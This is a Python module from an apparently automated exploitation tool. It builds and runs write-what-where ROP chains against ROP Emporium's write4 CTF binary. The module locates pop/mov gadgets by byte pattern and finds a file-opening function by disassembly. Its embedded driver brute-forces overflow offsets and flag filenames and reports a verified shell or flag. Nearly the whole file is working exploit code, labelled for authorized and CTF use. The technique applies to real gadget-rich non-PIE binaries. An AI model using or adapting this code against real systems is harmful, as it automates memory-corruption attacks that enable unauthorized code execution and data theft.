"""Write-what-where (stage a short string, then call a function with it), verified by execution.

Some binaries have NO pre-existing useful string (no "/bin/sh", no "/bin/cat flag.txt") and no
room in the overflow to carry one -- but they DO expose a `pop regA; pop regB; ret` +
`mov [regA], regB; ret` gadget pair (deliberately, in the teaching binaries this was built
against, but the same pair shows up in real gadget-rich binaries too). That combo is enough to
write 8 attacker-chosen bytes to ANY address the exploit controls, repeated as many times as
needed to build a longer NUL-terminated string -- then call a locally- or library-defined
function with a pointer to it.

Added after testing against a real CTF binary -- ROP Emporium's own `write4` challenge, not one
of this project's synthetic fixtures. `chainanalyzer.analyze_chains()` found no feasible chain
for it at all (none of its existing chain kinds model "write then call") -- a genuine gap, not a
verification-layer issue like the `ret2csu`/`pivot`/`callme` gaps fixed earlier tonight. Solved
generically:
  1. the write gadgets are found by byte pattern (like `autocsu.py`'s csu gadgets) for the
     confirmed-live register pair (r14/r15, this challenge's own convention) rather than
     hardcoded addresses.
  2. the staging address doesn't need to be a named symbol or a hardcoded `.data` offset --
     `ELF.bss()` (pwntools) already gives a safe, writable, ASLR-independent-in-a-non-PIE-binary
     address for free.
  3. the target function is found STRUCTURALLY, not by name: `print_file` matches none of the
     known gift keywords, but its body takes one argument via rdi and forwards it UNCHANGED into
     a call to `fopen`/`open` -- confirmed live by disassembling it with capstone (the exact same
     shape as any "read and print a file given its path" function) and recognizing that, local OR
     imported from a linked shared library exactly like `autocsu.py`'s strategy C.
  4. since the exploit itself has to GUESS the filename to pass (there's no leak to recover it
     from), a short list of common CTF flag-file names is tried, each chunked into 8-byte writes
     and NUL-padded to the next multiple of 8 -- a wrong guess just fails to verify, never a
     false positive.
Verified live end to end: writing "flag.txt" and calling the real `print_file` returns the real
flag `ROPE{a_placeholder_flag_for_this_demo_pastebin}`-shaped output from the real binary's own
flag.txt. For AUTHORIZED / CTF targets."""
from __future__ import annotations

import os

from ._sandbox import run_driver
from .autopivot import _dyn_needed, _undefined_funcs

try:
    from elftools.elf.elffile import ELFFile  # type: ignore
    _HAVE_ELFTOOLS = True
except Exception:
    _HAVE_ELFTOOLS = False

_BORING = {"_start", "_init", "_fini", "main", "frame_dummy", "register_tm_clones",
           "deregister_tm_clones", "__do_global_dtors_aux", "__libc_csu_init", "__libc_csu_fini"}

# Pares de registros pop/mov confirmados en vivo (r14/r15, convencion propia de este reto) mas
# un par de alternativas razonables -- ampliable sin tocar el resto del modulo.
_WRITE_GADGET_PATTERNS = [
    # (pop regA; pop regB; ret), (mov [regA], regB; ret)
    (bytes([0x41, 0x5e, 0x41, 0x5f, 0xc3]), bytes([0x4d, 0x89, 0x3e, 0xc3])),      # r14/r15
    (bytes([0x41, 0x5c, 0x41, 0x5d, 0xc3]), bytes([0x4d, 0x89, 0x2c, 0x24, 0xc3])),  # r12/r13 (via [rsp]-style ModRM, best-effort)
]

_CANDIDATE_NAMES = (b"flag.txt", b"flag", b"/flag.txt", b"/flag")


def _candidate_filenames() -> list:
    return list(_CANDIDATE_NAMES)


def _find_write_gadgets(binary: str):
    """Busca por patron de bytes (como `autocsu.py`'s G1/G2) el par pop-dos-registros +
    mov-a-memoria-con-esos-mismos-registros. Devuelve (pop_addr, write_addr) o (None, None)."""
    try:
        from pwn import ELF, context
        context.log_level = "error"
        elf = ELF(binary, checksec=False)
    except Exception:
        return None, None
    for pop_pat, write_pat in _WRITE_GADGET_PATTERNS:
        pop_addr = next(elf.search(pop_pat), None)
        write_addr = next(elf.search(write_pat), None)
        if pop_addr is not None and write_addr is not None:
            return pop_addr, write_addr
    return None, None


def _takes_rdi_and_opens(path: str, func_addr: int, size: int, plt_names_by_addr: dict) -> bool:
    """Desensambla la funcion en `func_addr` (dentro del ELF en `path`) y comprueba si toma UN
    argumento via rdi y lo reenvia (sin modificar) a una llamada a fopen/open -- la misma forma
    estructural que CUALQUIER funcion 'lee e imprime un fichero dado su nombre', sin asumir
    ningun nombre de simbolo. Confirmado en vivo contra el `print_file` real de ROP Emporium's
    write4 (vive en libwrite4.so, no tiene ningun nombre 'regalo' conocido)."""
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_OP_IMM  # type: ignore
    except Exception:
        return False
    try:
        with open(path, "rb") as f:
            elf = ELFFile(f)
            secs = []
            for sec in elf.iter_sections():
                try:
                    if sec["sh_flags"] & 0x4 and sec["sh_addr"]:
                        secs.append((sec["sh_addr"], sec.data()))
                except Exception:
                    continue
    except Exception:
        return False
    blob = None
    window = max(size, 0x20)
    for base, data in secs:
        if base <= func_addr < base + len(data):
            blob = data[func_addr - base: func_addr - base + window]
            break
    if not blob:
        return False
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True
    try:
        for insn in md.disasm(blob, func_addr):
            if insn.mnemonic == "call" and len(insn.operands) == 1 and insn.operands[0].type == CS_OP_IMM:
                target_name = plt_names_by_addr.get(insn.operands[0].imm)
                if target_name in ("fopen", "open"):
                    return True
    except Exception:
        return False
    return False


def _find_write_target(binary: str):
    """Encuentra la funcion 'imprime un fichero dado su nombre' por ESTRUCTURA (ver
    `_takes_rdi_and_opens`), local en `binary` o importada de una shared lib enlazada. Devuelve
    (nombre, direccion_local_o_None) o (None, None)."""
    if not _HAVE_ELFTOOLS:
        return None, None
    try:
        from pwn import ELF, context
        context.log_level = "error"
        main_elf = ELF(binary, checksec=False)
    except Exception:
        return None, None
    local = {}
    try:
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for secname in (".symtab", ".dynsym"):
                sec = elf.get_section_by_name(secname)
                if not sec:
                    continue
                for s in sec.iter_symbols():
                    if (s.name and s.name not in _BORING and s["st_info"]["type"] == "STT_FUNC"
                            and s["st_shndx"] != "SHN_UNDEF" and s["st_value"]):
                        local[s.name] = (s["st_value"], s["st_size"])
    except Exception:
        pass
    main_plt_by_addr = {v: k for k, v in (main_elf.plt or {}).items()}
    for name, (addr, size) in local.items():
        if _takes_rdi_and_opens(binary, addr, size, main_plt_by_addr):
            return name, addr

    undef = _undefined_funcs(binary)
    d = os.path.dirname(os.path.abspath(binary))
    for libname in _dyn_needed(binary):
        p = os.path.join(d, libname)
        if not os.path.isfile(p):
            continue
        try:
            lib_elf = ELF(p, checksec=False)
        except Exception:
            continue
        lib_plt_by_addr = {v: k for k, v in (lib_elf.plt or {}).items()}
        lib_local = {}
        try:
            with open(p, "rb") as f:
                elf = ELFFile(f)
                for secname in (".symtab", ".dynsym"):
                    sec = elf.get_section_by_name(secname)
                    if not sec:
                        continue
                    for s in sec.iter_symbols():
                        if (s.name and s.name not in _BORING and s["st_info"]["type"] == "STT_FUNC"
                                and s["st_shndx"] != "SHN_UNDEF" and s["st_value"]):
                            lib_local[s.name] = (s["st_value"], s["st_size"])
        except Exception:
            continue
        for name, (addr, size) in lib_local.items():
            if name not in undef:        # solo funciones que el binario principal SI importa
                continue
            if _takes_rdi_and_opens(p, addr, size, lib_plt_by_addr):
                return name, None
    return None, None


_DRIVER = r'''
import sys, time, re, json
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
_TARGET_NAME = sys.argv[2] if len(sys.argv) > 2 else ""
_POP_ADDR = int(sys.argv[3], 16) if len(sys.argv) > 3 and sys.argv[3] else 0
_WRITE_ADDR = int(sys.argv[4], 16) if len(sys.argv) > 4 and sys.argv[4] else 0
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (write4 driver is x86-64)"); sys.exit(1)
if not (_TARGET_NAME and _POP_ADDR and _WRITE_ADDR):
    print("NOT_APPLICABLE (missing target/gadgets)"); sys.exit(1)

target = elf.plt.get(_TARGET_NAME) or (elf.symbols or {}).get(_TARGET_NAME)
rop = ROP(elf)
try: pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
except Exception: pop_rdi = None
stage_addr = elf.bss()
if not (target and pop_rdi and stage_addr):
    print("NOT_APPLICABLE (target/pop_rdi/bss missing)"); sys.exit(1)

_FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}")
MARK = b"BINORACLE_WRITE4_PWNED"

def run(payload):
    io, out = None, b""
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(payload); time.sleep(0.2)
        try: out += io.recvrepeat(0.4)
        except Exception: pass
        try:
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out += io.recvrepeat(1.1)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            if io: io.close()
        except Exception: pass
    shelled = (MARK in out) or (b"uid=" in out)
    fm = _FLAG_RE.search(out.decode("latin1", "replace"))
    if shelled:
        return "shell", None
    if fm:
        return "flag", fm.group(0)
    return None, None

def write_chain(data):
    padded = data + b"\x00" * ((-len(data)) % 8)
    c = b""
    for i in range(0, len(padded), 8):
        c += p64(_POP_ADDR) + p64(stage_addr + i) + padded[i:i + 8]
        c += p64(_WRITE_ADDR)
    return c

_NAMES = [n.encode("latin1") for n in json.loads(sys.argv[5])] if len(sys.argv) > 5 and sys.argv[5] else [b"flag.txt"]

for off in [40, 32, 48, 56, 24, 64, 72, 80]:
    for candidate in _NAMES:
        payload = b"A" * off + write_chain(candidate) + p64(pop_rdi) + p64(stage_addr) + p64(target)
        kind, extra = run(payload)
        if kind == "flag":
            print("VERIFIED off=%d name=%r target=%s flag=%s" % (off, candidate, _TARGET_NAME, extra))
            sys.exit(0)
        if kind == "shell":
            print("VERIFIED off=%d name=%r target=%s" % (off, candidate, _TARGET_NAME))
            sys.exit(0)

print("NOT_VERIFIED")
sys.exit(1)
'''


def _write4_applicable(binary: str) -> bool:
    """Chequeo barato: necesita el par de gadgets pop-2-regs + mov-a-memoria Y una funcion
    'imprime fichero dado su nombre' (local o importada de una lib enlazada)."""
    pop_addr, write_addr = _find_write_gadgets(binary)
    if pop_addr is None or write_addr is None:
        return False
    return _find_write_target(binary)[0] is not None


def autowrite4(binary: str) -> dict:
    """Write-what-where (escalona un string corto en memoria con un gadget pop+mov, luego llama
    a una funcion con ese puntero) verificado por ejecucion. Para el patron real del reto
    'write4' de ROP Emporium -- un target sin ningun string ya presente en el binario y sin
    nombre 'regalo' conocido. Docker o sandbox nativo; degrada limpio."""
    pop_addr, write_addr = _find_write_gadgets(binary)
    if pop_addr is None or write_addr is None:
        return {"ok": False, "note": "no aplicable (sin gadgets pop-2-regs + mov-a-memoria)"}
    target_name, _ = _find_write_target(binary)
    if not target_name:
        return {"ok": False, "note": "no aplicable (sin funcion 'imprime fichero dado su nombre')"}
    import json as _json
    args = [target_name, hex(pop_addr), hex(write_addr),
            _json.dumps([n.decode("latin1") for n in _candidate_filenames()])]
    res = run_driver(binary, _DRIVER, ".binoracle_write4.py", args=args)
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"write-what-where: string escalonado + llamada verificada ({eng})"
                   if res.get("verified")
                   else f"write4: no verificado ({eng}) (gadgets/target/nombre de fichero/timing)")
    return res


def render_write4(r: dict) -> str:
    out = ["## Auto write4 (write-what-where, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell/flag verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
